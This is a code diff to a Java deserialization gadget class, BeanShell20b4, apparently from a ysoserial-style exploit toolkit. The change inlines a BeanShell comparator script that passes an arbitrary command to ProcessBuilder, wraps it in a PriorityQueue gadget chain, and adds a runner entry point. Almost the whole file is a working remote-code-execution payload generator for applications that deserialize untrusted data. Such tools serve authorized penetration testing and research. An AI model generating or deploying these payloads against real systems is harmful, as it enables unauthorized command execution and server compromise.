@@ -1,14 +1,16 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.Strings;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import bsh.BshClassManager;
 import bsh.Interpreter;
 import javassist.CtClass;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.BeanShellUtil;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.lang.reflect.*;
+import java.util.Arrays;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
@@ -19,10 +21,15 @@ import static A.R.ysogate.payloads.handle.ClassFieldHandler.insertField;
  * @author su18
  */
 @Dependencies({"org.beanshell:bsh:2.0b4"})
-public class BeanShell20b4 implements ObjectPayload<PriorityQueue> {
+public class BeanShell20b4 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
 	public PriorityQueue getObject(String command) throws Exception {
-		String payload = BeanShellUtil.makeBeanShellPayload(command);
+		String payload =
+				"compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
+						Strings.join( // does not support spaces in quotes
+								Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
+								",", "\"", "\"") +
+						"}).start();return new Integer(1);}";
 
 		CtClass ctClass4 = POOL.get("bsh.Primitive");
 		insertField(ctClass4, "serialVersionUID", "private static final long serialVersionUID = -1164390191642946889L;");
@@ -63,5 +70,8 @@ public class BeanShell20b4 implements ObjectPayload<PriorityQueue> {
 		Reflections.setFieldValue(priorityQueue, "queue", queue);
 		Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
 		return priorityQueue;
+	}
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(BeanShell20b4.class, args);
 	}
 }
